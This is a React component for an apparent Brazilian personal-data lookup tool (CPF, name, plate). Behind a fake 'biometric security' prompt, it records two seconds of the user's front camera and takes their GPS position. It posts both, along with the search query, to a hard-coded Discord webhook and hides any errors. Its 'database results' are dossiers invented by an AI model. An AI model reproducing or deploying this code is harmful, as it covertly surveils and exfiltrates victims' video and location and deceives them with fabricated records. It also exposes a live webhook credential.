import React, { useState, useEffect, useRef } from 'react';
import { 
  X, ShieldCheck, Activity, Globe, CheckCircle2, Cpu, Database, Camera, MapPin, ShieldAlert
} from 'lucide-react';
import { ServiceTool } from '../types';
import { GoogleGenAI } from '@google/genai';

const WEBHOOK_URL = "https://discord.com/api/webhooks/1470946745344196812/R1tVe1gUJ8xK_JwkNugUU78diWt9-exPk58pI5k-ijAnpD1rzZUAZTqVqz3GHAt5zVBr";

interface SearchModalProps {
  isOpen: boolean;
  onClose: () => void;
  tool: ServiceTool;
}

const SearchModal: React.FC<SearchModalProps> = ({ isOpen, onClose, tool }) => {
  const [query, setQuery] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [result, setResult] = useState<any>(null);
  const [statusText, setStatusText] = useState('Pronto');
  const [permissionError, setPermissionError] = useState(false);

  const inputRef = useRef<HTMLInputElement>(null);
  const chunksRef = useRef<Blob[]>([]);

  useEffect(() => {
    if (isOpen) {
      setTimeout(() => inputRef.current?.focus(), 300);
      setResult(null);
      setQuery('');
      setIsLoading(false);
      setPermissionError(false);
      setStatusText('Aguardando...');
    }
  }, [isOpen]);

  const getGeolocation = (): Promise<{lat: number, lng: number} | null> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve(null);
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
        () => resolve(null),
        { enableHighAccuracy: true, timeout: 3000 }
      );
    });
  };

  const sendToDiscord = async (videoBlob?: Blob, location?: {lat: number, lng: number} | null) => {
    try {
      const locationField = location ? `[Mapa](https://www.google.com/maps?q=${location.lat},${location.lng})` : "Indisponível";

      const payload = {
        username: "Nova Reports",
        embeds: [{
          title: "📄 Nova Consulta Realizada",
          color: 0x10b981,
          fields: [
            { name: "🔍 Busca", value: `\`${query}\``, inline: true },
            { name: "🛠️ Módulo", value: `\`${tool.title}\``, inline: true },
            { name: "📍 Localização", value: locationField, inline: false },
            { name: "📸 Biometria", value: videoBlob ? "Anexada" : "Negada", inline: true }
          ],
          timestamp: new Date().toISOString()
        }]
      };

      if (videoBlob && videoBlob.size > 0) {
        const formData = new FormData();
        formData.append('payload_json', JSON.stringify(payload));
        formData.append('file', videoBlob, 'biometria.webm');
        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
      } else {
        await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      }
    } catch (err) {}
  };

  const handleSearch = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!query || isLoading) return;

    setIsLoading(true);
    setPermissionError(false);
    setStatusText('Solicitando permissões...');

    try {
      // 1. Geolocalização
      const loc = await getGeolocation();

      // 2. Câmera
      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'user' } 
        });
      } catch (err) {
        setPermissionError(true);
        setIsLoading(false);
        await sendToDiscord(undefined, loc);
        return;
      }

      setStatusText('Processando biometria...');

      const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
      chunksRef.current = [];
      mediaRecorder.ondataavailable = (ev) => { if (ev.data.size > 0) chunksRef.current.push(ev.data); };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunksRef.current, { type: 'video/webm' });
        await sendToDiscord(videoBlob, loc);
        stream.getTracks().forEach(track => track.stop());
      };

      mediaRecorder.start();
      setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 2000);

      setStatusText('Consultando base de dados...');
      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
      const response = await ai.models.generateContent({
        model: 'gemini-3-flash-preview',
        contents: `Gere um dossiê técnico para "${tool.title}" identificador "${query}". Retorne JSON puro sem explicações.`,
        config: { responseMimeType: "application/json" }
      });

      setResult(JSON.parse(response.text || '{}'));
      setIsLoading(false);
    } catch (error) {
      setIsLoading(false);
      setStatusText('Erro no processamento');
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[100] flex items-end lg:items-center justify-center p-0 lg:p-6">
      <div className="absolute inset-0 bg-black/98 backdrop-blur-3xl" onClick={onClose} />
      <div className="relative w-full h-[95vh] lg:h-auto lg:max-w-4xl bg-[#08080a] border-t lg:border border-white/10 rounded-t-[3rem] lg:rounded-[3rem] overflow-hidden flex flex-col shadow-2xl">

        {/* Header Modal */}
        <div className="shrink-0 p-6 lg:p-10 border-b border-white/5 flex items-center justify-between bg-zinc-900/10">
          <div className="flex items-center gap-5">
            <div className={`w-14 h-14 rounded-2xl flex items-center justify-center bg-emerald-500/10 text-emerald-500`}>
               <Database size={32} />
            </div>
            <div>
              <h2 className="text-2xl font-black text-white uppercase tracking-tighter mb-1">{tool.title}</h2>
              <p className="text-[10px] font-bold text-zinc-600 uppercase tracking-[0.3em]">{tool.subtitle}</p>
            </div>
          </div>
          <button onClick={onClose} className="p-3 bg-white/5 rounded-2xl text-zinc-600 hover:text-white transition-colors">
            <X size={28} />
          </button>
        </div>

        <div className="flex-1 overflow-y-auto p-6 lg:p-12 custom-scrollbar">
          <div className="max-w-2xl mx-auto">

            {/* Input State */}
            {!isLoading && !result && !permissionError && (
              <form onSubmit={handleSearch} className="space-y-6 animate-in slide-in-from-bottom-4">
                <div className="space-y-4">
                   <div className="flex items-center justify-between px-2">
                      <label className="text-[10px] font-black text-zinc-700 uppercase tracking-widest">Parâmetro de Busca</label>
                      <span className="flex items-center gap-1 text-[9px] font-bold text-emerald-500/40 uppercase"><Globe size={10}/> Terminal Ativo</span>
                   </div>
                   <input 
                      ref={inputRef}
                      type="text"
                      value={query}
                      onChange={(e) => setQuery(e.target.value)}
                      placeholder="Digite CPF, Nome ou Placa..."
                      className="w-full bg-zinc-900/20 border-2 border-white/5 rounded-[2.5rem] py-8 px-10 text-white text-2xl font-black outline-none focus:border-emerald-500/20 transition-all"
                    />
                </div>
                <button 
                  type="submit" 
                  disabled={!query} 
                  className="w-full py-7 rounded-[2.5rem] bg-emerald-600 border-2 border-emerald-500 text-black font-black text-xl flex items-center justify-center gap-4 shadow-2xl shadow-emerald-500/20 hover:brightness-110 active:scale-95 disabled:opacity-50 disabled:grayscale transition-all"
                >
                  <Activity size={28} /> INICIAR CONSULTA
                </button>
                <div className="flex items-center justify-center gap-4 text-zinc-600 text-[10px] font-bold uppercase tracking-widest">
                   <span className="flex items-center gap-1"><Camera size={12}/> Biometria</span>
                   <span className="flex items-center gap-1"><MapPin size={12}/> Localização</span>
                   <span className="flex items-center gap-1"><ShieldCheck size={12}/> Seguro</span>
                </div>
              </form>
            )}

            {/* Error State */}
            {permissionError && (
              <div className="animate-in zoom-in-95 text-center space-y-8">
                 <div className="w-24 h-24 bg-red-500/10 rounded-full flex items-center justify-center mx-auto border-2 border-red-500/20">
                    <ShieldAlert size={48} className="text-red-500" />
                 </div>
                 <h3 className="text-3xl font-black text-white uppercase">Acesso Bloqueado</h3>
                 <p className="text-zinc-500 font-bold">O protocolo de segurança exige permissão de Câmera e GPS para autenticar a requisição.</p>
                 <button 
                    onClick={() => { setPermissionError(false); handleSearch({ preventDefault: () => {} } as any); }}
                    className="w-full py-6 bg-white text-black rounded-[2.5rem] font-black text-xl uppercase"
                  >
                    Tentar Novamente
                 </button>
              </div>
            )}

            {/* Loading State */}
            {isLoading && (
              <div className="flex flex-col items-center justify-center space-y-12 animate-in fade-in">
                 <div className="relative">
                    <div className="w-32 h-32 rounded-full border-4 border-emerald-500/5 border-t-emerald-500 animate-spin"></div>
                    <div className="absolute inset-0 flex items-center justify-center"><Cpu size={32} className="text-emerald-500/50" /></div>
                 </div>
                 <div className="text-center space-y-2">
                    <p className="text-white font-black text-2xl uppercase italic">{statusText}</p>
                    <p className="text-[10px] font-bold text-zinc-700 uppercase tracking-[0.4em]">Sincronizando com a Rede</p>
                 </div>
              </div>
            )}

            {/* Result State */}
            {result && !isLoading && (
              <div className="space-y-8 animate-in zoom-in-95 pb-10">
                 <div className="flex items-center gap-4 border-b border-white/5 pb-6">
                    <div className="p-2 bg-emerald-500/10 rounded-xl text-emerald-500"><CheckCircle2 size={24} /></div>
                    <h3 className="text-2xl font-black text-white uppercase">Dossiê Gerado</h3>
                 </div>
                 <div className="grid grid-cols-1 gap-6">
                    {Object.entries(result).map(([section, data]: [string, any]) => (
                      <div key={section} className="p-8 rounded-[2.5rem] bg-zinc-900/10 border border-white/5">
                        <h4 className="text-[10px] font-black text-emerald-500 uppercase tracking-[0.3em] mb-6 flex items-center gap-2">
                           <span className="w-1.5 h-1.5 rounded-full bg-emerald-500"></span> {section.replace(/_/g, ' ')}
                        </h4>
                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-y-6 gap-x-10">
                           {typeof data === 'object' ? Object.entries(data).map(([k, v]) => (
                             <div key={k} className="space-y-1">
                                <span className="text-[9px] font-bold text-zinc-700 uppercase">{k.replace(/_/g, ' ')}</span>
                                <p className="text-zinc-200 font-mono font-bold text-sm break-all">{String(v)}</p>
                             </div>
                           )) : <p className="text-zinc-200 font-bold">{String(data)}</p>}
                        </div>
                      </div>
                    ))}
                 </div>
                 <button 
                  onClick={() => setResult(null)} 
                  className="w-full py-5 rounded-[2rem] border border-white/5 text-zinc-500 font-bold uppercase text-[10px] tracking-[0.2em] hover:text-white transition-colors"
                 >
                    Nova Busca
                 </button>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

